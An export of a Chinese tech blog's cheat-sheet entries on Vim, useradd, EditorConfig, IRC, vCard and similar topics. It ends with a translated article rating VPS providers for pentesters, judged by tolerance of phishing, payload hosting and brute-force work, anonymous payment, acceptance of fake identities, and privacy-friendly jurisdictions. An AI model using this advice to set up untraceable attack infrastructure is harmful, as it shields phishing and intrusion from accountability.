<p>URL，全称&quot;Uniform Resource Locator&quot;，中文“统一资源定位符”，URL 是 URI 的子集。例如 <code>https://howiezhao.github.io/2018/04/29/url-uri/</code><br>这个 URL 唯一标识了互联网中一台服务器上的一篇文章（即本篇文章）。URL 的格式一般为 <code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></p>
<p>URN，全称&quot;Uniform Resource Name&quot;，中文“统一资源名称”，是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。例如 <code>urn:isbn:9780141036144</code> 这个 URN 唯一标识了乔治·奥威尔所著的《1984》。</p>
<p>简单说，URL 代表一个人的位置，URN 代表一个人的身份证号，通过 URL 和 URN 都可以唯一的找到这个人，所以它们都属于 URI。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>useradd 与 adduser</title>
    <url>/2018/07/16/useradd-adduser/</url>
    <content><![CDATA[<p>在 Linux 中创建用户可以用 <code>useradd</code> 或者 <code>adduser</code>，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录 Shell 等相关配置，而这两个命令之间的差异就在于此。</p>
<h2 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h2><p>当使用 <code>adduser howie</code> 命令时，系统除了创建 howie 用户，还会自动创建用户主目录、同名用户组、登录 Shell 等，并提示输入用户密码，这一切操作都将以一个对话的形式完成。</p>
<p>在某些新版本的 RedHat 系 Linux 中，<code>adduser</code> 是 <code>useradd</code> 的一个软链接，即别名。</p>
<h2 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h2><p>当使用 <code>useradd howie</code> 命令时，系统只会创建 howie 用户，而不会创建用户密码、用户主目录、同名用户组、登录 Shell 等，若要指定密码，可以接着采用 <code>passwd howie</code> 命令。其次，<code>useradd</code> 有众多参数，我们可以通过使用这些参数来达到和 <code>adduser</code> 一样的效果，如 <code>useradd -d /home/howie -m -s /bin/bash howie</code>，不过注意之后还得使用 <code>passwd</code> 命令创建密码，当然也可以使用 <code>-p</code> 参数直接设置密码，但这样会将密码直接显示在终端屏幕上，不安全。</p>
<h2 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h2><p>当使用 <code>userdel howie</code> 命令时，系统只会删除 howie 用户，并不会删除用户主目录以及用户邮箱目录，因此可以使用 <code>-r</code> 参数。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>版本号的意义</title>
    <url>/2018/09/21/version-number/</url>
    <content><![CDATA[<p>软件版本号的确定没有一个统一的规范，但大都遵循一个固定的格式，即<code>X.Y.Z</code>格式，其中：</p>
<ul>
<li>X代表<strong>主版本号</strong>，一般当软件整体重写，或出现不向后兼容的改变等重大更新时，增加X，同时重置Y、Z为0，X为0时表示软件还在开发阶段；</li>
<li>Y代表<strong>次版本号</strong>，增删功能时增加Y，同时重置Z为0；</li>
<li>Z代表<strong>修订号</strong>，修复Bug时增加Z。</li>
</ul>
<p>除此之外，还会有一些修饰词，比如：</p>
<ul>
<li><code>alpha</code>表示内部测试版；</li>
<li><code>beta</code>表示公开测试版；</li>
<li><code>rc</code>即Release Candidate，表示候选版本，即将作为正式版发布；</li>
<li><code>release</code>表示正式发行版；</li>
<li><code>lts</code>即Long Term Support，表示长期支持版。</li>
</ul>
<p>有的项目有自己的一套规则，比如Ubuntu、Visual Studio等，它们采用发布年份作为版本号；Node.js规定X为偶数的是稳定版，X为奇数的是开发版；TeX的版本号不断趋近于π。<br>随着版本号定义的越来越混乱，GitHub起草了一个<a href="https://semver.org/lang/zh-CN/">语义化版本(Semantic Versioning)</a>规范，为开源项目做出了一定指导意义。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Vim小记</title>
    <url>/2018/09/18/vim/</url>
    <content><![CDATA[<p>在几乎所有的Linux发行版中，都会自带vi文本编辑器，而<a href="https://www.vim.org/">Vim</a>（Vi IMproved）则是vi的一个增强版，大多数Linux中也都预装了Vim，若没有安装，可使用相应的包管理工具进行安装，具体而言，在Ubuntu中，使用<code>sudo apt install vim</code>即可安装。输入<code>vim --version</code>可以查看所使用的Vim版本，当前最新版本为Vim 8.x。值得注意的是，在有的系统中，<code>vi</code>命令实际是指向<code>vim</code>命令的一个链接，使用<code>which vi</code>即可证实。</p>
<p>在2015年，开源组织发布了<a href="https://neovim.io/">Neovim</a>项目，它是Vim的重构版本，需自行安装。另外，GVim是Vim的一个图形客户端。</p>
<span id="more"></span>
<h2 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h2><p>Vim有许多模式，但常用的其实是普通模式、插入模式、命令行模式这三种。</p>
<h3 id="普通模式（Normal）"><a href="#普通模式（Normal）" class="headerlink" title="普通模式（Normal）"></a>普通模式（Normal）</h3><p>Vim启动后默认为普通模式，此时Vim编辑器左下角将依次显示文件名、行数、字符数，右下角将依次显示当前光标所在的行与列、当前屏幕显示的字数占文件总字数的百分比。在普通模式下可以使用相当多的快捷键来完成相应的操作，常用的命令如下：</p>
<ul>
<li><code>x</code>：删除当前光标所在字符</li>
<li><code>dd</code>：删除当前行</li>
<li><code>0</code>：到行头</li>
<li><code>$</code>：到行尾</li>
<li><code>u</code>：撤销</li>
</ul>
<h3 id="插入模式（Insert）"><a href="#插入模式（Insert）" class="headerlink" title="插入模式（Insert）"></a>插入模式（Insert）</h3><p>在普通模式下输入<code>i</code>(insert)，即可切换到插入模式，此时Vim编辑器左下角将显示<code>-- INSERT --</code>标识。在插入模式下，可完成输入文字等功能。最后，按下<code>Esc</code>键可退回普通模式。</p>
<h3 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h3><p>在命令行模式下可以输入会被执行的相关命令，例如执行命令(<code>:</code>键)、搜索命令(<code>/</code>键)或者过滤命令(<code>!</code>键)。此时，Vim编辑器左下角将显示输入的命令。在命令执行之后，Vim将返回到命令行模式之前的模式，通常是普通模式。<br>在命令行模式下常使用的命令有：</p>
<ul>
<li><code>:wq</code>：保存(write)并退出(quit)</li>
<li><code>:1</code>：跳转到第一行，类似的，跳转到第n行则为<code>:n</code></li>
<li><code>:set nu</code>：显示行号(number)，类似的，<code>:set nonu</code>为不显示行号</li>
<li><code>:set ff=unix</code>：设置文件为unix格式</li>
</ul>
<h2 id="vimrc"><a href="#vimrc" class="headerlink" title="vimrc"></a>vimrc</h2><p>Vim有多个配置文件，当前用户的配置文件为用户家目录下的<code>.vimrc</code>隐藏文件，Vim启动时会按照该文件中的配置开启相应的功能。个人常做的基本配置项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; 这是一行注释</span><br><span class="line">&quot; 显示行号</span><br><span class="line">set number</span><br><span class="line"></span><br><span class="line">&quot; 语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot; tab缩进</span><br><span class="line">set tabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set smarttab</span><br><span class="line"></span><br><span class="line">&quot; 鼠标可用</span><br><span class="line">&quot;set mouse=a</span><br><span class="line"></span><br><span class="line">&quot; 配色方案</span><br><span class="line">set t_Co=256</span><br><span class="line">set background=dark</span><br><span class="line">colorscheme desert</span><br><span class="line"></span><br><span class="line">&quot; 匹配模式</span><br><span class="line">set showmatch</span><br><span class="line"></span><br><span class="line">&quot; 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set smartindent</span><br><span class="line"></span><br><span class="line">&quot; 显示命令</span><br><span class="line">set showcmd</span><br></pre></td></tr></table></figure>

<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>Vim自带了多种主题，即配色方案，默认存放在Vim安装目录下的colors文件夹下，在Vim中输入命令<code>:echo $VIMRUNTIME</code>即可显示Vim的安装目录，以我的为例，其安装目录为<code>/usr/share/vim/vim80</code>。</p>
<p>如果你想更改默认的主题，可以按照上面的配置，在<code>vimrc</code>文件中使用<code>colorscheme &lt;主题名&gt;</code>进行配置。Vim默认使用的是<code>default</code>主题。如果你想使用第三方或自定义的主题，则需要将下载的主题文件存放到colors文件夹下（<code>~/.vim/colors</code>下也行），然后再进行相关配置。</p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Vim支持很多插件，为了简化插件的安装，由此诞生了许多的插件管理器，<a href="https://github.com/VundleVim/Vundle.vim">Vundle</a>是使用最多的Vim插件管理器，但个人倾向于使用<a href="https://github.com/junegunn/vim-plug">vim-plug</a>插件管理器，vim-plug相比Vundle最大的优势是支持异步安装，该特性可以极大的加速多个插件的安装速度。<br>使用如下命令即可安装vim-plug：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/<span class="built_in">autoload</span>/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>

<p>安装完vim-plug插件管理器后，只需在<code>.vimrc</code>文件中做相关配置，然后进入Vim的命令行模式，输入<code>:PlugInstall</code>命令，即可自动下载并安装相应的插件，升级插件可使用<code>:PlugUpdate</code>命令，升级vim-plug本身，可使用<code>:PlugUpgrade</code>命令。个人常用的插件如下：</p>
<ul>
<li><a href="https://github.com/scrooloose/nerdtree">NERDTree</a>：显示文件树形目录</li>
<li><a href="https://github.com/Valloric/YouCompleteMe">YouCompleteMe</a>：代码自动补全</li>
<li><a href="https://github.com/mhinz/vim-startify">startify</a>：自定义起始页</li>
</ul>
<p>相应的，<code>.vimrc</code>文件中插件相关的配置项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; vim-plug</span><br><span class="line">call plug#begin(&#x27;~/.vim/plugged&#x27;)</span><br><span class="line"></span><br><span class="line">function! BuildYCM(info)</span><br><span class="line">  &quot; info is a dictionary with 3 fields</span><br><span class="line">  &quot; - name:   name of the plugin</span><br><span class="line">  &quot; - status: &#x27;installed&#x27;, &#x27;updated&#x27;, or &#x27;unchanged&#x27;</span><br><span class="line">  &quot; - force:  set on PlugInstall! or PlugUpdate!</span><br><span class="line">  if a:info.status == &#x27;installed&#x27; || a:info.force</span><br><span class="line">    !./install.py</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line">Plug &#x27;Valloric/YouCompleteMe&#x27;, &#123; &#x27;do&#x27;: function(&#x27;BuildYCM&#x27;) &#125;</span><br><span class="line">Plug &#x27;scrooloose/nerdtree&#x27;, &#123; &#x27;on&#x27;:  &#x27;NERDTreeToggle&#x27; &#125;</span><br><span class="line">Plug &#x27;mhinz/vim-startify&#x27;</span><br><span class="line"></span><br><span class="line">call plug#end()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>网站统计与分析</title>
    <url>/2018/09/22/web-analytics/</url>
    <content><![CDATA[<h2 id="几个术语"><a href="#几个术语" class="headerlink" title="几个术语"></a>几个术语</h2><ul>
<li>PV：Page View，即页面浏览量或点击量，用户每次刷新即被计算一次。</li>
<li>UV：Unique Visitor，指独立访客数，以cookie为依据，访问网站的一台电脑客户端为一个访客。一天内相同的客户端只会被计算一次。</li>
<li>IP：指独立IP数。一天内相同IP地址只被计算一次。</li>
</ul>
<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><p>有许多第三方的工具可以帮助站长统计和分析网站流量，比如<a href="https://tongji.baidu.com/">百度统计</a>、<a href="http://ta.qq.com/">腾讯分析</a>、<a href="https://analytics.google.com/analytics/web">Google Analytics(GA)</a>等。个人经常使用Google Analytics。<br>这类工具的原理大致为：它们会生成一段特定的JS代码，站长需要将这段代码插入到自己网站的页面中，当访客访问网站时，这段代码会收集访客的行为信息，并上传到它们的服务器上。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>网站的WWW问题</title>
    <url>/2018/09/12/web-www/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>开发环境代表什么</title>
    <url>/2018/09/23/what-is-development-environment/</url>
    <content><![CDATA[<p>按照编程语言的执行原理，一般将其分为<strong>编译型语言</strong>（如 C）和<strong>解释型语言</strong>（如 Python），对于编译型语言来说，它的开发环境就代表该语言的<strong>编译器</strong>和其<strong>基本类库</strong>，对于解释型语言来说，它的开发环境就代表该语言的<strong>解释器</strong>和其<strong>基本类库</strong>。请注意，这里我并没有提到<strong>编辑器</strong>，因为编辑器并不属于每种语言所特有的范畴。</p>
<p>对于解释型语言来说，它的开发环境就等于运行环境，而对于编译型语言，可以说它不需要运行环境。请注意，Java 可以理解为是一种<strong>先编译后解释</strong>的语言，所以运行 Java 程序之前需要安装 JRE（Java 运行环境）。</p>
<p>如今许多语言的 IDE（集成开发环境），已经集编辑器、该语言的编译器/解释器、基本类库等于一体。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>editorconfig 是什么</title>
    <url>/2018/09/23/what-is-editorconfig/</url>
    <content><![CDATA[<p>开发同一项目的不同的人，可能会使用不同的编辑器，又会有不同的设置，这就会造成不同的代码格式，为了统一同一项目的代码格式，由此诞生了 <a href="https://editorconfig.org/">EditorConfig</a> ，它包含了<strong>一个用于定义代码格式的文件</strong>和<strong>一批编辑器插件</strong>，这些插件可以让编辑器读取配置文件并依此格式化代码。</p>
<p>一个典型的 EditorConfig 配置文件如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是一行注释，以#开头</span><br><span class="line"></span><br><span class="line"># 表示此文件为最顶级</span><br><span class="line">root = true</span><br><span class="line"></span><br><span class="line"># 设定每个文件每行以换行（LF）结束，文件末尾添加一个新行</span><br><span class="line">[*]</span><br><span class="line">end_of_line = lf</span><br><span class="line">insert_final_newline = true</span><br><span class="line"></span><br><span class="line"># 匹配所有以 js 和 py 为后缀名的文件</span><br><span class="line"># 设定其编码为 UTF-8</span><br><span class="line">[*.&#123;js,py&#125;]</span><br><span class="line">charset = utf-8</span><br><span class="line"></span><br><span class="line"># 匹配所有以 py 为后缀名的文件，设定其缩进为 4 个空格</span><br><span class="line">[*.py]</span><br><span class="line">indent_style = space</span><br><span class="line">indent_size = 4</span><br><span class="line"></span><br><span class="line"># 设定 Makefile 文件的缩进为 Tab</span><br><span class="line">[Makefile]</span><br><span class="line">indent_style = tab</span><br><span class="line"></span><br><span class="line"># 匹配lib目录下所有以 js 为后缀名的文件，设定其缩进为 2 个空格</span><br><span class="line">[lib/**.js]</span><br><span class="line">indent_style = space</span><br><span class="line">indent_size = 2</span><br><span class="line"></span><br><span class="line"># 设定 package.json 和 .travis.yml 的缩进为 2 个空格</span><br><span class="line">[&#123;package.json,.travis.yml&#125;]</span><br><span class="line">indent_style = space</span><br><span class="line">indent_size = 2</span><br></pre></td></tr></table></figure>

<p>此配置文件应该保存为 <code>.editorconfig</code> 并放置在项目目录中，编辑器的 EditorConfig 插件会从文件打开目录开始依次向其父级目录查找并读取配置文件，直到遇见 <code>root = true</code> 为止。</p>
<p>有很多项目在初始化时都会生成相应的 <code>.editorconfig</code> 文件，比如 Angular。</p>
<p>另外，Visual Studio 和 JetBrains 家的大部分 IDE 都已经原生支持了 EditorConfig，因此不用再安装插件；对于 Sublime Text 和 Vim 等未原生支持的编辑器，EditorConfig 官网提供了相应的插件下载地址。要了解详细的支持列表，请访问 EditorConfig 官网。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>IRC 是什么</title>
    <url>/2018/09/12/what-is-irc/</url>
    <content><![CDATA[<p><strong>IRC</strong>，全称 Internet Relay Chat，即<strong>因特网中继聊天</strong>，是早期经常使用的网络聊天方式，其主要用于群体聊天，但同样也可以用于个人对个人的聊天。</p>
<p>IRC 协议属于应用层协议，使用的传输层协议为 TCP，使用的端口为 <strong>6667</strong>（明文传输，如 <code>irc://chat.freenode.net</code>）或 <strong>6697</strong>（SSL 加密传输，如 <code>ircs://chat.freenode.net:6697</code>）。</p>
<p>IRC 是一个<strong>分布式</strong>的 <strong>C/S</strong> 架构，一个 IRC 服务器可以连接其他的 IRC 服务器以扩展为一个<strong>IRC 网络</strong>，通过连接到一个 IRC 服务器，我们可以访问这个服务器以及它所连接的其他服务器上的<strong>频道</strong>，频道存在于一个 IRC 服务器上，一个频道类似于一个聊天室，频道名称必须以 <code>#</code> 符号开始，例如 <code>#irchelp</code>。</p>
<p>大多数的 IRC 服务器不需要客户注册登录，虽然在连接前必须设定好昵称（nickname），但客户端一般都会自动分配一个。</p>
<p>目前使用最广的 IRC 服务器为 <a href="https://freenode.net/">freenode</a> ，而 IRC 客户端软件有多种，比如基于 Firefox 浏览器的 IRC 插件 <a href="http://chatzilla.hacksrus.com/">ChatZilla</a> ，基于网页的 <a href="https://webchat.freenode.net/">Webchat</a> ，基于命令行的 <a href="https://irssi.org/">Irssi</a> 、<a href="https://weechat.org/">WeeChat</a> 等等。</p>
<p>个人经常使用的 IRC 客户端为 Irssi，在 Ubuntu 中可以使用 <code>apt install irssi</code> 安装，之后直接输入 <code>irssi</code> 即可启动，输入 <code>irssi --help</code> 可查看更多命令参数。<br>启动 irssi 后可输入更多的命令，输入 <code>/help</code> 可查看所有可用命令，输入 <code>/connect Freenode</code> 即可连接到 freenode 服务器，之后再输入 <code>/join #linuxba</code> 即可加入 <code>#linuxba</code> 频道。<br>这里需要注意，freenode 服务器由于种种原因，在国内无法访问，而 irssi 又不支持代理，所以推荐使用 <a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng</a> 代理 irssi。</p>
<p>最后，值得推荐的 IRC 频道有下（基于 freenode）：</p>
<ul>
<li><code>#ubuntu-cn</code>：Ubuntu 中文社区频道</li>
<li><code>#archlinux-cn</code>：Arch Linux 中文社区频道</li>
<li><code>#linuxba</code>：Linux 贴吧频道</li>
<li><code>#haskell</code>：Haskell 语言频道</li>
<li><code>#vim</code>：Vim 社区频道</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>vCard 是什么</title>
    <url>/2021/02/04/what-is-vcard/</url>
    <content><![CDATA[<p>vCard 是广为使用的电子名片的文件格式标准，常用于手机通讯录文件中，其后缀名常为 <code>.vcf</code>。</p>
<p>一个典型的 vCard 文件内容如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:2.1</span><br><span class="line">N;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testa</span><br><span class="line">FN;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testa</span><br><span class="line">TEL;CELL:12345678910</span><br><span class="line">END:VCARD</span><br><span class="line">BEGIN:VCARD</span><br><span class="line">VERSION:2.1</span><br><span class="line">N;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testb</span><br><span class="line">FN;CHARSET=UTF-8;ENCODING=QUOTED-PRINTABLE:testb</span><br><span class="line">TEL;CELL:12345678910</span><br><span class="line">END:VCARD</span><br></pre></td></tr></table></figure>

<p>每个 vCard 条目通过 <code>BEGIN:VCARD</code> 与 <code>END:VCARD</code> 包裹，其中 <code>VERSION</code> 字段表示 vCard 版本号，<code>N</code> 和 <code>FN</code> 字段分别表示 <em>姓名</em> 和 <em>名</em>，<code>TEL</code> 字段表示电话号码。</p>
<p>GitHub 上的 <a href="https://github.com/metowolf/vCards">vCards</a> 项目提供了类似中国黄页的功能。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>白帽子 VPS 选购指南</title>
    <url>/2019/02/25/whitehat-vps/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/">https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/</a> ，正文如下：</p>
<p>从受信任的 VPS 进行网络钓鱼活动和托管 Metasploit 会话对于任何专业安全研究人员，渗透测试人员或白帽黑客都很重要。但是，可供选择的 VPS 非常有限，因为大多数提供商对任何类型的黑客都有零容忍政策，无论好坏。在研究了数十种产品之后，我们选出了 5 个理想的产品，非常适合 Null Byte 读者。</p>
<span id="more"></span>
<p>首先要理解的事情是......什么是 VPS？嗯，它代表虚拟专用服务器，是许多用户认为的专用或私有服务器的虚拟化形式，即使它安装在同时运行多个操作系统的物理计算机上。VPS 最常用于在线托管网站。</p>
<p>当我们从提供商处购买 VPS 时，我们实际上是在一个有着许多虚拟服务器的功能强大的高性能物理机器上“租用”一个分区。每个 VPS 都连接到互联网，使个人客户能够使用不同的操作系统，并提供对操作系统的完全 root 访问权限。每个客户（或服务器管理员）独立于共享 VPS 公司提供的物理计算机上的其他客户运营。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/news/what-is-white-hat-hacker-0166878/">什么是白帽黑客？</a></li>
</ul>
<p>从本质上讲，虚拟专用服务器是我们可以从世界上任何连接互联网的设备远程控制的计算机。这给了我们很大的能力。对于远程服务器而言，下面是它可以完成的一些事情：</p>
<ul>
<li>创建 VPN 连接</li>
<li>托管网络钓鱼站点</li>
<li>进行暴力攻击</li>
<li>创建 IRC 机器人</li>
<li>服务器代理</li>
<li>托管有效载荷</li>
<li>使用端口扫描器</li>
<li>创建蜜罐</li>
<li>托管 Metasploit 会话</li>
</ul>
<p>为了做到这一点，从我们的研究来看，<a href="https://bulletshield.su/">BulletShield</a> 是迄今为止最好的白帽和渗透测试人员的 VPS 提供商，紧随其后的是 <a href="https://buyvm.net/">BuyVM</a> 和 <a href="https://www.clientvps.com/">ClientVPS</a>。亚军是 <a href="https://vpsdime.com/">VPSDime</a> 和 <a href="https://onehostcloud.hosting/">OneHost Cloud</a>。你可以在下面的图表中看到原因，但跳到下面可以深入研究每个比较点的含义。<br><img src="https://img.wonderhowto.com/img/36/31/63655508941243/0/white-hats-guide-choosing-virtual-private-server.w1456.jpg" alt="图表"></p>
<h2 id="关键比较点"><a href="#关键比较点" class="headerlink" title="关键比较点"></a>关键比较点</h2><p>网上有几个 VPS 对比图表，但没有一个对我来说是与渗透测试人员和白帽子有所联系的。在大多数专业的渗透测试场景中，我们需要在几天内启动 VPS 来托管有效载荷，接收泄漏数据或执行网络钓鱼攻击。</p>
<p>无论 VPS 提供商是否提供实时技术支持，难以理解的硬件规格或过多的操作系统选择都很重要。理想情况下，我们希望使用比特币（BTC）从位于尊重隐私的国家的 VPS 提供商处快速购买最新的 Debian 版本。</p>
<p>在比较本文中介绍的 VPS 提供商时，我试图尽可能客观公正。本文中没有 VPS 提供商付费参与比较图表。我使用下面的标准来得出上面的图表。</p>
<ul>
<li>不要错过：<a href="https://smartphones.gadgethacks.com/how-to/binance-101-sell-your-stellar-ripple-other-alt-coins-for-bitcoin-ethereum-0182373/">如何在比特币和以太坊中出售你的 Stellar，Ripple 和其他替代币？</a></li>
</ul>
<h3 id="最好的价钱（Best-Price）"><a href="#最好的价钱（Best-Price）" class="headerlink" title="最好的价钱（Best Price）"></a>最好的价钱（Best Price）</h3><p>我相信定价透明度。这意味着提供商完全诚实地说他们的月费是多少。我的图表中列出的价格可能并不总是反映出给定提供商在主页上公布的价格。我的图表中的价格是计算所有强制性和隐藏费用后的结账价格。这些也是我在网站上找到的最便宜的 VPS 计划的价格。在大多数情况下，这通常有着 512 MB 的 RAM 和 1 个 CPU 内核。</p>
<h3 id="渗透测试人员友好型（Pentester-Friendly）"><a href="#渗透测试人员友好型（Pentester-Friendly）" class="headerlink" title="渗透测试人员友好型（Pentester-Friendly）"></a>渗透测试人员友好型（Pentester-Friendly）</h3><p>服务条款（ToS）和可接受的使用政策（AUP）可能是进入此比较图表的最高优先项。虽然最初考虑了数十个 VPS 提供商，但大多数明确禁止或阻止端口扫描器，有效载荷分发，网络钓鱼和（或）任何类型的黑客攻击。除了少数例外，这会立即取消 VPS 提供商在比较图表中的资格。</p>
<p>IT 专业人员，安全研究人员和自学成才的白帽黑客在远程服务器上做了大量工作。对我来说很重要的是，这里的 VPS 提供商保留了最符合 Null Byte 受众需求的 ToS 政策。我的图表中的 VPS 提供商是少数几个没有完全敌视“黑客攻击”的 ToS 政策的提供商。</p>
<p>那些被认为是对渗透测试人员友好的提供商并没有在他们的 ToS 中明确声明允许“黑客攻击”（或任何相关术语）。没有一个 VPS 提供商会这样做。大多数这些提供商要么没有提及他们的 ToS 中的黑客攻击，要么他们的网站上根本没有提供 ToS。这被认为表明黑客攻击活动非常不受欢迎，但可能不会导致帐户终止。</p>
<h3 id="请求个人信息（Requests-Personal-Info）"><a href="#请求个人信息（Requests-Personal-Info）" class="headerlink" title="请求个人信息（Requests Personal Info）"></a>请求个人信息（Requests Personal Info）</h3><p>向任何网站提交我们的真实姓名，地址，电话号码和其他个人身份信息都是不可取的。即使匿名不是你的首要任务，VPS 提供商仍有一天可能会受到攻击，并且所有客户数据都会在网上泄露。</p>
<p>购买 VPS 订阅是理想的匿名完成，因为没有人知道我们在研究或渗透测试期间会遇到什么麻烦。对于你购买的服务器上发生的事情，有朝一日可能会对 VPS 提供商采取法律行动，因此最好将有关你自己的少量信息存储在提供商的客户数据库中。</p>
<p>在大多数情况下，我发现在注册期间可以提交一个完全虚假的姓名，地址和电话号码，但我并不认为这是提供商的“好功能”。向任何合法公司提交虚假信息几乎肯定会违反提供商的服务条款并导致帐户立即终止。</p>
<p>VPS 提供商要求的电子邮件地址不属于“个人信息”，因为匿名获取一次性电子邮件地址很容易。毕竟 VPS 提供商需要建立与客户沟通的有效方法。</p>
<h3 id="接受比特币付款（Accepts-BTC-Payments）"><a href="#接受比特币付款（Accepts-BTC-Payments）" class="headerlink" title="接受比特币付款（Accepts BTC Payments）"></a>接受比特币付款（Accepts BTC Payments）</h3><p>如果获得比特币（BTC）不是障碍，这可能是你的首选付款方式。目前大多数提供商都接受比特币，但使用匿名加密货币的好处大部分都被 VPS 提供商对个人身份信息的请求所抵消。我发现使用比特币进行在线购物比使用信用卡更快更方便。</p>
<h3 id="接受预付信用卡（Accepts-Prepaid-Credit-Cards）"><a href="#接受预付信用卡（Accepts-Prepaid-Credit-Cards）" class="headerlink" title="接受预付信用卡（Accepts Prepaid Credit Cards）"></a>接受预付信用卡（Accepts Prepaid Credit Cards）</h3><p>获取比特币进行匿名交易可能很困难。用现金购买<a href="https://null-byte.wonderhowto.com/how-to/securely-anonymously-spend-money-online-0131351/">预付卡或一次性借记卡</a>可能更方便。如果没有使用预付借记卡实际提交付款，很难验证这一点。在大多数情况下，我能够联系客户服务代表，并从他们那里获得有关使用预付卡进行交易的直接答复。</p>
<h3 id="Tor-友好型网站（Tor-Friendly-Website）"><a href="#Tor-友好型网站（Tor-Friendly-Website）" class="headerlink" title="Tor 友好型网站（Tor-Friendly Website）"></a>Tor 友好型网站（Tor-Friendly Website）</h3><p>如果你通过安全的 VPN 连接使用信用卡进行在线购买或通过 Tor 匿名进行在线购买，VPS 提供商有时会暂停你的帐户。联系客户支持并解决暂停可能需要数天时间。</p>
<p>我使用同一个常用的 Firefox 浏览器通过 Tor 浏览了每个站点。要求访问者填写验证码以查看其网站或处理结帐的提供商被标记为对希望保持匿名的用户不友好。这并不意味着可以通过 Tor 进行事务处理。在查看这些网站时，我只尽可能地进入结账过程，而不实际提交付款。</p>
<ul>
<li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/access-dark-web-while-staying-anonymous-with-tor-0179341/">如何使用 Tor 匿名的访问暗网？</a></li>
</ul>
<h3 id="公司总部所在国（Company-HQ-39-s-Country）"><a href="#公司总部所在国（Company-HQ-39-s-Country）" class="headerlink" title="公司总部所在国（Company HQ&#39;s Country）"></a>公司总部所在国（Company HQ&#39;s Country）</h3><p>认为提供安全加密交易的公司将与当局充分<a href="https://www.theregister.co.uk/2011/09/26/hidemyass_lulzsec_controversy/">合作以捕获黑客</a>并不是不切实际的。VPS 的 IP 地址是否来自尊重隐私的国家并不总是重要的。如果向你提供 VPS 的公司位于美国或英国，他们很可能会毫不犹豫地将你的个人信息交给任何权威人士。</p>
<p>进一步涉及隐私问题，<a href="https://zh.wikipedia.org/wiki/%E8%8B%B1%E7%BE%8E%E5%8D%94%E5%AE%9A">UKUSA 协议</a>是英国，美国，澳大利亚，加拿大和新西兰之间的协议，旨在合作收集，分析和共享情报。这个群体的成员被称为<a href="https://zh.wikipedia.org/wiki/%E4%BA%94%E7%9C%BC%E8%81%AF%E7%9B%9F">五眼联盟</a>。这些国家因拥有侵犯隐私的法律和政策而臭名昭著。</p>
<p>在最尊重隐私的国家选择 VPS 提供商可能不是最优先考虑的问题，但至少考虑具有<a href="https://nomadcapitalist.com/2013/12/15/top-5-best-countries-host-website-data-privacy/">良好隐私法律的国家</a>的提供商是有意义的。</p>
<h3 id="离岸解决方案（Offshore-Solutions）"><a href="#离岸解决方案（Offshore-Solutions）" class="headerlink" title="离岸解决方案（Offshore Solutions）"></a>离岸解决方案（Offshore Solutions）</h3><p>“离岸 VPS”意味着服务器位于公司的国家边界位置之外，并且可能允许一定程度的自由裁量权。这对你作为渗透测试人员以及你受委托保护的公司非常重要，因为你可能会收到不应共享或泄露的妥协和敏感信息。我们鼓励读者独立询问 VPS 提供商，以确定他们的离岸解决方案是否适合你。</p>
